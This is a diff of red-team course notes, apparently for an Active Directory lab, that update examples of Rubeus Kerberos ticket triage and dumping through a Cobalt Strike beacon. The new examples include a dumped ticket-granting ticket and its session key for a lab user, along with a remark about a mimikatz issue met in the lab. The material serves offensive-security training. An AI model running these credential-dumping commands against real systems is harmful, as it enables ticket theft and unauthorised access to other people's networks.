@@ -6,8 +6,6 @@ description: 11/15/2025
 
 ## Host Privilege Escalation
 
-### Windows Services
-
 #### Viewing the services installed on a machine
 
 **We can use** <mark style="color:yellow;">services.msc</mark> **or the** <mark style="color:yellow;">sc</mark> **command-line tool (**<mark style="color:$success;">Use Command Prompt here</mark>**):**
@@ -728,6 +726,8 @@ There is a [known issue](https://github.com/gentilkiwi/mimikatz/issues/314) wher
 
 
 In this case, the AES256 key is the one we want.  These hashes are not automatically populated into the Credential data model, but they can be added manually via _**View > Credentials > Add**_.
+
+<mark style="color:$danger;">I LITERALLY RAN INTO THIS DURING THE LAB BE WARNED.</mark>
 {% endhint %}
 
 ### Security Account Manager (SAM)
@@ -781,9 +781,8 @@ DCC is orders of magnitude slower to crack than NTLM.
 #### List all Kerberos Tickets in current elevated logon session&#x20;
 
 ```
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
-
-  ______        _                      
+ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
+  
   (_____ \      | |                     
    _____) )_   _| |__  _____ _   _  ___ 
   |  __  /| | | |  _ \| ___ | | | |/___)
@@ -795,32 +794,33 @@ beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
 
 Action: Triage Kerberos Tickets (All Users)
 
-[*] Current LUID    : 0x3e7
+[*] Current LUID    : 0x992f2f
 
  ------------------------------------------------------------------------------------------------------------------- 
  | LUID     | UserName                     | Service                                       | EndTime               |
  ------------------------------------------------------------------------------------------------------------------- 
- | 0x4214ae | nlamb @ DEV.CYBERBOTIC.IO    | krbtgt/DEV.CYBERBOTIC.IO                      | 11/17/2025 9:34:39 AM |
- | 0x4214ae | nlamb @ DEV.CYBERBOTIC.IO    | ldap/dc-2.dev.cyberbotic.io                   | 11/17/2025 9:34:39 AM |
- | 0x1109b4 | bfarmer @ DEV.CYBERBOTIC.IO  | krbtgt/DEV.CYBERBOTIC.IO                      | 11/17/2025 8:39:00 AM |
- | 0x1109b4 | bfarmer @ DEV.CYBERBOTIC.IO  | ldap/dc-2.dev.cyberbotic.io/dev.cyberbotic.io | 11/17/2025 8:39:00 AM |
- | 0x1109b4 | bfarmer @ DEV.CYBERBOTIC.IO  | cifs/dc-2.dev.cyberbotic.io                   | 11/17/2025 8:39:00 AM |
- | 0x11092f | bfarmer @ DEV.CYBERBOTIC.IO  | krbtgt/CYBERBOTIC.IO                          | 11/17/2025 8:38:59 AM |
- | 0x11092f | bfarmer @ DEV.CYBERBOTIC.IO  | HTTP/scm-1.cyberbotic.io                      | 11/17/2025 8:38:59 AM |
- | 0x11092f | bfarmer @ DEV.CYBERBOTIC.IO  | cifs/dc-1.cyberbotic.io/cyberbotic.io         | 11/17/2025 8:38:59 AM |
- | 0x11092f | bfarmer @ DEV.CYBERBOTIC.IO  | ldap/dc-1.cyberbotic.io/cyberbotic.io         | 11/17/2025 8:38:59 AM |
- | 0x11092f | bfarmer @ DEV.CYBERBOTIC.IO  | LDAP/dc-2.dev.cyberbotic.io/dev.cyberbotic.io | 11/17/2025 8:38:59 AM |
- | 0x3e4    | wkstn-2$ @ DEV.CYBERBOTIC.IO | krbtgt/DEV.CYBERBOTIC.IO                      | 11/17/2025 8:35:26 AM |
- | 0x3e4    | wkstn-2$ @ DEV.CYBERBOTIC.IO | ldap/dc-2.dev.cyberbotic.io/dev.cyberbotic.io | 11/17/2025 8:35:26 AM |
- | 0x3e4    | wkstn-2$ @ DEV.CYBERBOTIC.IO | cifs/dc-2.dev.cyberbotic.io                   | 11/17/2025 8:35:26 AM |
- | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | krbtgt/CYBERBOTIC.IO                          | 11/17/2025 8:35:26 AM |
- | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | ldap/dc-1.cyberbotic.io                       | 11/17/2025 8:35:26 AM |
- | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | cifs/dc-2.dev.cyberbotic.io/dev.cyberbotic.io | 11/17/2025 8:35:26 AM |
- | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | cifs/dc-1.cyberbotic.io/cyberbotic.io         | 11/17/2025 8:35:26 AM |
- | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | ldap/dc-1.cyberbotic.io/cyberbotic.io         | 11/17/2025 8:35:26 AM |
- | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | WKSTN-2$                                      | 11/17/2025 8:35:26 AM |
- | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | LDAP/dc-2.dev.cyberbotic.io                   | 11/17/2025 8:35:26 AM |
- | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | LDAP/dc-2.dev.cyberbotic.io/dev.cyberbotic.io | 11/17/2025 8:35:26 AM |
+ | 0x992f2f | nlamb @ DEV.CYBERBOTIC.IO    | krbtgt/DEV.CYBERBOTIC.IO                      | 11/19/2025 9:49:30 AM |
+ | 0x992f2f | nlamb @ DEV.CYBERBOTIC.IO    | ldap/dc-2.dev.cyberbotic.io                   | 11/19/2025 9:49:30 AM |
+ | 0x55120f | bfarmer @ DEV.CYBERBOTIC.IO  | krbtgt/DEV.CYBERBOTIC.IO                      | 11/19/2025 8:57:36 AM |
+ | 0x55120f | bfarmer @ DEV.CYBERBOTIC.IO  | ldap/dc-2.dev.cyberbotic.io/dev.cyberbotic.io | 11/19/2025 8:57:36 AM |
+ | 0x55120f | bfarmer @ DEV.CYBERBOTIC.IO  | cifs/dc-2.dev.cyberbotic.io                   | 11/19/2025 8:57:36 AM |
+ | 0x5511d0 | bfarmer @ DEV.CYBERBOTIC.IO  | krbtgt/DEV.CYBERBOTIC.IO                      | 11/19/2025 8:57:36 AM |
+ | 0x5511d0 | bfarmer @ DEV.CYBERBOTIC.IO  | HTTP/scm-1.cyberbotic.io                      | 11/19/2025 8:57:36 AM |
+ | 0x5511d0 | bfarmer @ DEV.CYBERBOTIC.IO  | cifs/dc-1.cyberbotic.io/cyberbotic.io         | 11/19/2025 8:57:36 AM |
+ | 0x5511d0 | bfarmer @ DEV.CYBERBOTIC.IO  | ldap/dc-1.cyberbotic.io/cyberbotic.io         | 11/19/2025 8:57:36 AM |
+ | 0x5511d0 | bfarmer @ DEV.CYBERBOTIC.IO  | LDAP/dc-2.dev.cyberbotic.io/dev.cyberbotic.io | 11/19/2025 8:57:36 AM |
+ | 0x84e75  | jking @ DEV.CYBERBOTIC.IO    | krbtgt/DEV.CYBERBOTIC.IO                      | 11/19/2025 7:58:50 AM |
+ | 0x3e4    | wkstn-2$ @ DEV.CYBERBOTIC.IO | krbtgt/DEV.CYBERBOTIC.IO                      | 11/19/2025 7:57:46 AM |
+ | 0x3e4    | wkstn-2$ @ DEV.CYBERBOTIC.IO | cifs/dc-2.dev.cyberbotic.io                   | 11/19/2025 7:57:46 AM |
+ | 0x3e4    | wkstn-2$ @ DEV.CYBERBOTIC.IO | ldap/dc-2.dev.cyberbotic.io/dev.cyberbotic.io | 11/19/2025 7:57:46 AM |
+ | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | krbtgt/CYBERBOTIC.IO                          | 11/19/2025 7:57:48 AM |
+ | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | HTTP/scm-1.cyberbotic.io                      | 11/19/2025 7:57:48 AM |
+ | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | cifs/dc-2.dev.cyberbotic.io/dev.cyberbotic.io | 11/19/2025 7:57:48 AM |
+ | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | cifs/dc-1.cyberbotic.io/cyberbotic.io         | 11/19/2025 7:57:48 AM |
+ | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | ldap/dc-1.cyberbotic.io/cyberbotic.io         | 11/19/2025 7:57:48 AM |
+ | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | WKSTN-2$                                      | 11/19/2025 7:57:48 AM |
+ | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | LDAP/dc-2.dev.cyberbotic.io                   | 11/19/2025 7:57:48 AM |
+ | 0x3e7    | wkstn-2$ @ DEV.CYBERBOTIC.IO | ldap/dc-2.dev.cyberbotic.io/dev.cyberbotic.io | 11/19/2025 7:57:48 AM |
  -------------------------------------------------------------------------------------------------------------------
 ```
 
@@ -843,7 +843,7 @@ Tickets for service name `krbtgt` are Ticket Granting Tickets (TGTs) and others 
 **For example, if we only wanted the TGT for `bfarmer`, we can do:**
 
 ```
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x11092f /service:krbtgt /nowrap
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x84e75 /service:krbtgt /nowrap
 
    ______        _                      
   (_____ \      | |                     
@@ -858,34 +858,34 @@ beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /lui
 Action: Dump Kerberos Ticket Data (All Users)
 
 [*] Target service  : krbtgt
-[*] Target LUID     : 0x11092f
-[*] Current LUID    : 0x3e7
+[*] Target LUID     : 0x84e75
+[*] Current LUID    : 0xa292fa
 
-  UserName                 : bfarmer
+  UserName                 : jking
   Domain                   : DEV
-  LogonId                  : 0x11092f
-  UserSID                  : S-1-5-21-569305411-121244042-2357301523-1104
+  LogonId                  : 0x84e75
+  UserSID                  : S-1-5-21-569305411-121244042-2357301523-1105
   AuthenticationPackage    : Kerberos
-  LogonType                : RemoteInteractive
-  LogonTime                : 11/16/2025 10:38:57 PM
+  LogonType                : Batch
+  LogonTime                : 11/18/2025 9:58:48 PM
   LogonServer              : DC-2
   LogonServerDNSDomain     : DEV.CYBERBOTIC.IO
-  UserPrincipalName        : bfarmer@cyberbotic.io
+  UserPrincipalName        : jking@cyberbotic.io
 
 
-    ServiceName              :  krbtgt/CYBERBOTIC.IO
+    ServiceName              :  krbtgt/DEV.CYBERBOTIC.IO
     ServiceRealm             :  DEV.CYBERBOTIC.IO
-    UserName                 :  bfarmer
+    UserName                 :  jking
     UserRealm                :  DEV.CYBERBOTIC.IO
-    StartTime                :  11/16/2025 10:39:02 PM
-    EndTime                  :  11/17/2025 8:38:59 AM
-    RenewTill                :  11/23/2025 10:38:59 PM
-    Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
-    KeyType                  :  rc4_hmac
-    Base64(key)              :  FRSX1AWG/eqmFxOa0MiVbA==
+    StartTime                :  11/18/2025 9:58:50 PM
+    EndTime                  :  11/19/2025 7:58:50 AM
+    RenewTill                :  11/25/2025 9:58:50 PM
+    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+    KeyType                  :  aes256_cts_hmac_sha1
+    Base64(key)              :  LTovMHNCu7EWKfVqxkfB9f6crVX/vHusZ7PZ1QJH+IY=
     Base64EncodedTicket   :
 
-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
+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
 
 ```
 
